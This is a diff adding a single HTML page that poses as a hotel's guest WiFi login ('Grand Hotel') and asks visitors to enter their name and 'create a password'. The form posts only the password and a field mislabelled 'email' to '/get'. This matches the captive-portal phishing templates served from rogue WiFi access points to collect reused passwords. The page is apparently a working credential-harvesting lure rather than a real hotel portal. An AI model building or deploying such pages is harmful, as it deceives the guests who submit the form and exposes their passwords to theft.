@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Hotel WiFi - Guest Access</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',Roboto,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;background:#f5f0eb}
+.header{width:100%;padding:20px;background:#1a1a2e;text-align:center;position:fixed;top:0}
+.header h2{color:#c9a96e;font-size:18px;font-weight:400;letter-spacing:3px;text-transform:uppercase}
+.container{width:90%;max-width:400px;margin-top:80px}
+.card{background:#fff;border-radius:4px;padding:40px 32px;box-shadow:0 2px 20px rgba(0,0,0,.08)}
+.welcome{text-align:center;margin-bottom:30px}
+.welcome h1{font-size:24px;font-weight:300;color:#1a1a2e;margin-bottom:8px}
+.welcome p{font-size:13px;color:#888;line-height:1.6}
+.sep{width:40px;height:2px;background:#c9a96e;margin:16px auto}
+label{display:block;font-size:12px;text-transform:uppercase;letter-spacing:1px;color:#999;margin-bottom:6px;font-weight:500}
+.field{margin-bottom:18px}
+.field input,.field select{width:100%;padding:12px 14px;border:1px solid #e0dcd7;border-radius:3px;font-size:14px;color:#333;background:#faf9f7;transition:border .2s}
+.field input:focus,.field select:focus{outline:none;border-color:#c9a96e}
+.field input::placeholder{color:#bbb}
+.row{display:flex;gap:12px}
+.row .field{flex:1}
+.btn{width:100%;padding:14px;background:#1a1a2e;border:none;border-radius:3px;color:#c9a96e;font-size:14px;letter-spacing:2px;text-transform:uppercase;cursor:pointer;transition:background .2s;margin-top:6px}
+.btn:hover{background:#2a2a4e}
+.footer{text-align:center;margin-top:20px;font-size:11px;color:#aaa;line-height:1.6}
+.footer a{color:#c9a96e;text-decoration:none}
+</style>
+</head>
+<body>
+<div class="header"><h2>Grand Hotel</h2></div>
+<div class="container">
+<div class="card">
+<div class="welcome">
+<h1>Welcome, Guest</h1>
+<div class="sep"></div>
+<p>Please enter your details to access<br>complimentary high-speed WiFi</p>
+</div>
+<form method="POST" action="/get">
+<div class="row">
+<div class="field">
+<label>First Name</label>
+<input name="email" type="text" placeholder="Your name" required autocomplete="off">
+</div>
+<div class="field">
+<label>Room Number</label>
+<input type="text" placeholder="e.g. 204">
+</div>
+</div>
+<div class="field">
+<label>Email Address</label>
+<input type="email" placeholder="guest@email.com">
+</div>
+<div class="field">
+<label>Password</label>
+<input name="password" type="password" placeholder="Create a password" required>
+</div>
+<button class="btn" type="submit">Connect to WiFi</button>
+</form>
+</div>
+<p class="footer">
+Complimentary WiFi for registered guests.<br>
+By connecting you accept our <a href="#">Terms & Conditions</a>.<br>
+Need help? Contact reception at ext. 0
+</p>
+</div>
+</body>
+</html>
